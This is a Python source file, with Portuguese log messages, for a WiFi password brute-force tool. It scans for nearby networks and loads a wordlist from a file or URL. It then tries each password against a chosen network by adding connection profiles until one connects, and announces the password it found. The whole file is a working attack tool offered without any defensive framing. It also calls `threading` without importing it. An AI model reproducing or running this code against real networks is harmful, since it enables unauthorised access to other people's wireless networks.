import pywifi
from pywifi import const
import urllib.request
import time

class WifiBruteForceLogic:
    def __init__(self, ui):
        self.ui = ui

    def load_passwords_from_url(self, url, log_func):
        if not url:
            log_func("[×] Informe a URL da wordlist.")
            return

        def task():
            log_func(f"[+] Baixando lista de senhas da URL: {url}")
            try:
                with urllib.request.urlopen(url) as response:
                    lines = [line.decode("utf-8").strip() for line in response if line.strip()]
                self.ui.passwords = lines
                log_func(f"[✓] Wordlist carregada com {len(lines)} senhas.")
            except Exception as e:
                log_func(f"[×] Erro ao baixar wordlist: {e}")

        threading.Thread(target=task, daemon=True).start()

    def load_passwords_from_file(self, path, log_func):
        def task():
            log_func(f"[+] Lendo lista de senhas do arquivo: {path}")
            try:
                with open(path, "r", encoding="utf-8") as f:
                    lines = [line.strip() for line in f if line.strip()]
                self.ui.passwords = lines
                log_func(f"[✓] Wordlist carregada com {len(lines)} senhas.")
            except Exception as e:
                log_func(f"[×] Erro ao ler arquivo: {e}")

        threading.Thread(target=task, daemon=True).start()

    def scan_networks(self, iface, quick_mode):
        iface.scan()
        time.sleep(1 if quick_mode else 3)
        results = iface.scan_results()
        networks = []
        seen = set()
        
        for net in results:
            if net.ssid and net.ssid not in seen:
                seen.add(net.ssid)
                auth = self.auth_to_string(net.akm)
                networks.append({
                    'ssid': net.ssid,
                    'signal': net.signal,
                    'auth': auth
                })
        return networks

    def auth_to_string(self, akm_list):
        if not akm_list:
            return "Aberto"
        names = []
        for akm in akm_list:
            if akm == const.AKM_TYPE_NONE:
                names.append("Aberto")
            elif akm == const.AKM_TYPE_WPA:
                names.append("WPA")
            elif akm == const.AKM_TYPE_WPAPSK:
                names.append("WPA-PSK")
            elif akm == const.AKM_TYPE_WPA2:
                names.append("WPA2")
            elif akm == const.AKM_TYPE_WPA2PSK:
                names.append("WPA2-PSK")
            elif akm == const.AKM_TYPE_WPA3:
                names.append("WPA3")
            else:
                names.append("Outro")
        return ", ".join(names)

    def brute_force(self, iface, ssid, passwords, auth, verbose, stop_flag, log_func):
        def connect(ssid, password):
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm = []
            if "WPA" in auth:
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
            else:
                profile.akm.append(const.AKM_TYPE_NONE)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            time.sleep(2.5)
            return iface.status() == const.IFACE_CONNECTED

        for pwd in passwords:
            if stop_flag.is_set():
                log_func("[!] Ataque interrompido pelo usuário.")
                break
            if len(pwd) < 8:
                if verbose:
                    log_func(f"[SKIP] Senha muito curta: {pwd}")
                continue
            if verbose:
                log_func(f"[TESTANDO] {pwd}")
            else:
                log_func(f"[TESTANDO] {pwd}")

            if connect(ssid, pwd):
                log_func(f"\n[✓] SENHA ENCONTRADA: {pwd}")
                break
        else:
            if not stop_flag.is_set():
                log_func("\n[×] Nenhuma senha funcionou.")